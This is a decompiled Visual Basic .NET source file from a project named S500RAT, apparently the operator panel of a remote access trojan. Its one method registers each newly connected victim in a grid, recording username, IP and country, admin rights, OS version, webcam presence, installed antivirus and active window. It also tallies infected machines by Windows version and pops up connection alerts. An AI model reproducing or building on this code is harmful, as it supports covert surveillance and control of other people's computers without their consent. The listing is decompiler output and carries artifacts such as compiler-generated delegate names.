Imports System
Imports System.Collections.Generic
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My.Resources
Imports S500RAT.Server
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200006A RID: 106
	Public Class DataList
		' Token: 0x060011DD RID: 4573 RVA: 0x0009F7EC File Offset: 0x0009D9EC
		Public Shared Sub AddArray(Client_0 As Clients, unpack_msgpack As MsgPack)
			Dim lockBlocked As Object = Setting.LockBlocked
			ObjectFlowControl.CheckForSyncLockOnValueType(lockBlocked)
			SyncLock lockBlocked
				Try
					Dim flag2 As Boolean = Client_0.L IsNot Nothing
					If flag2 Then
						DataB.form1_0.L1.Rows.Remove(Client_0.L)
						Return
					End If
				Catch ex As Exception
				End Try
			End SyncLock
			Dim IPInfo As String() = Strings.Split(DataList.IPInformtion.Info(Client_0.TcpClient.RemoteEndPoint.ToString().Split(New Char() { ":"c })(0)), ":", -1, CompareMethod.Binary)
			Dim item As DataGridViewRow = New DataGridViewRow() With { .Height = 30 }
			Try
				item.Cells.Add(New DataGridViewImageCell() With { .Value = Resources.BlackL1, .ImageLayout = DataGridViewImageCellLayout.Stretch })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("ClientName").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = IPInfo(0).ToString() })
				Try
					item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("PC").AsString })
				Catch ex2 As Exception
					item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = "??" })
				End Try
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("UserName").AsString })
				item.Cells.Add(New DataGridViewImageCell() With { .Value = DataB.form1_0.IsAdmin.Images(unpack_msgpack.ForcePathObject("Admin").AsString + ".png"), .ImageLayout = DataGridViewImageCellLayout.Zoom })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Date").AsString })
				item.Cells.Add(New DataGridViewImageCell() With { .Value = DataB.form1_0.ImgFalg.Images(IPInfo(2) + ".png"), .ImageLayout = DataGridViewImageCellLayout.Zoom })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = IPInfo(1).ToString() })
				item.Cells.Add(New DataGridViewImageCell() With { .Value = DataB.form1_0.WinList.Images(unpack_msgpack.ForcePathObject("OsVersion").AsString + ".png"), .ImageLayout = DataGridViewImageCellLayout.Zoom })
				Try
					item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Windows").AsString })
				Catch ex3 As Exception
					item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = "??" })
				End Try
				item.Cells.Add(New DataGridViewImageCell() With { .Value = DataB.form1_0.IsAdmin.Images(unpack_msgpack.ForcePathObject("Cam").AsString + ".png"), .ImageLayout = DataGridViewImageCellLayout.Zoom })
				Try
					item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("AV").AsString })
				Catch ex4 As Exception
					item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = "??" })
				End Try
				item.Cells.Add(New DataGridViewImageCell() With { .Value = DataB.form1_0.IsAdmin.Images("0.png"), .ImageLayout = DataGridViewImageCellLayout.Zoom })
				Dim cells As DataGridViewCellCollection = item.Cells
				Dim dataGridViewTextBoxCell As DataGridViewTextBoxCell = New DataGridViewTextBoxCell()
				Dim dataGridViewCell As DataGridViewCell = dataGridViewTextBoxCell
				Dim msgPack As MsgPack = unpack_msgpack.ForcePathObject("ACT")
				Dim msgPack2 As MsgPack = msgPack
				Dim asString As String = msgPack.AsString
				Dim value As Object = Functions.DencryptBase64ToString(asString)
				msgPack2.AsString = asString
				dataGridViewCell.Value = value
				cells.Add(dataGridViewTextBoxCell)
				item.Resizable = DataGridViewTriState.[False]
				Dim lockDataGridViewClients As Object = Setting.LockDataGridViewClients
				ObjectFlowControl.CheckForSyncLockOnValueType(lockDataGridViewClients)
				SyncLock lockDataGridViewClients
					DataB.form1_0.L1.Invoke(New VB$AnonymousDelegate_0(Sub()
						DataB.form1_0.L1.Rows.Add(item)
					End Sub))
					Client_0.L = item
					Client_0.L.Tag = Client_0
					DataB.form1_0.L1Home.Invoke(New VB$AnonymousDelegate_0(Sub()
						DataB.form1_0.L1Home.Rows.Add(New Object() { DataB.form1_0.ImgFalg.Images(IPInfo(2) + ".png"), IPInfo(1).ToString(), IPInfo(0).ToString(), unpack_msgpack.ForcePathObject("UserName").AsString.ToString(), unpack_msgpack.ForcePathObject("Windows").AsString, unpack_msgpack.ForcePathObject("AV").AsString, DataB.form1_0.WinList.Images("Connected.png") })
					End Sub))
					DataB.form1_0.Invoke(New MethodInvoker(Sub()
						Dim flag4 As Boolean = DataB.form1_0.L1.Rows.Count < 1500
						If flag4 Then
							DataList.notff.NotifClient(IPInfo(0).ToString(), unpack_msgpack.ForcePathObject("UserName").AsString, unpack_msgpack.ForcePathObject("Windows").AsString, IPInfo(1).ToString(), True)
						End If
						ListLogs.AddArray(String.Concat(New String() { "Client ", IPInfo(0).ToString(), " \ ", unpack_msgpack.ForcePathObject("PC").AsString, " \ ", unpack_msgpack.ForcePathObject("Windows").AsString, "  Connected" }), 4)
						DataB.form1_0.NumAllSystem.Text = Conversions.ToString(DataB.form1_0.L1.Rows.Count)
						Dim asString2 As String = unpack_msgpack.ForcePathObject("OsVersion").AsString
						Dim flag5 As Boolean = Operators.CompareString(asString2, "7", False) = 0
						If flag5 Then
							Dim numWizndowsXpAnd As UILabel = DataB.form1_0.NumWizndowsXpAnd7
							Dim uilabel As UILabel = numWizndowsXpAnd
							numWizndowsXpAnd.Text = Conversions.ToString(Conversions.ToDouble(uilabel.Text) + 1.0)
							DataB.form1_0.ProgressBarWizndowsXPAnd7.Maximum = DataB.form1_0.L1.Rows.Count
							DataB.form1_0.ProgressBarWizndowsXPAnd7.Value = Conversions.ToInteger(DataB.form1_0.NumWizndowsXpAnd7.Text)
						Else
							Dim flag6 As Boolean = Operators.CompareString(asString2, "8", False) = 0
							If flag6 Then
								Dim numWizndows As UILabel = DataB.form1_0.NumWizndows8
								Dim uilabel As UILabel = numWizndows
								numWizndows.Text = Conversions.ToString(Conversions.ToDouble(uilabel.Text) + 1.0)
								DataB.form1_0.ProgressBarWizndows8.Maximum = DataB.form1_0.L1.Rows.Count
								DataB.form1_0.ProgressBarWizndows8.Value = Conversions.ToInteger(DataB.form1_0.NumWizndows8.Text)
							Else
								Dim flag7 As Boolean = Operators.CompareString(asString2, "10", False) = 0
								If flag7 Then
									Dim numWzindows As UILabel = DataB.form1_0.NumWzindows10
									Dim uilabel As UILabel = numWzindows
									numWzindows.Text = Conversions.ToString(Conversions.ToDouble(uilabel.Text) + 1.0)
									DataB.form1_0.ProgressBarWizndows10.Maximum = DataB.form1_0.L1.Rows.Count
									DataB.form1_0.ProgressBarWizndows10.Value = Conversions.ToInteger(DataB.form1_0.NumWzindows10.Text)
								Else
									Dim flag8 As Boolean = Operators.CompareString(asString2, "11", False) = 0
									If flag8 Then
										Dim numWizndows2 As UILabel = DataB.form1_0.NumWizndows11
										Dim uilabel As UILabel = numWizndows2
										numWizndows2.Text = Conversions.ToString(Conversions.ToDouble(uilabel.Text) + 1.0)
										DataB.form1_0.ProgressBarWizndows11.Maximum = DataB.form1_0.L1.Rows.Count
										DataB.form1_0.ProgressBarWizndows11.Value = Conversions.ToInteger(DataB.form1_0.NumWizndows11.Text)
									End If
								End If
							End If
						End If
					End Sub))
				End SyncLock
			Catch ex5 As Exception
			End Try
		End Sub

		' Token: 0x040007E1 RID: 2017
		Private Shared notff As HelpNotif = New HelpNotif()

		' Token: 0x040007E2 RID: 2018
		Private Shared IPInformtion As GetIPInfo = New GetIPInfo()

		' Token: 0x040007E3 RID: 2019
		Private Shared ListCountry As List(Of String) = New List(Of String)()
	End Class
End Namespace
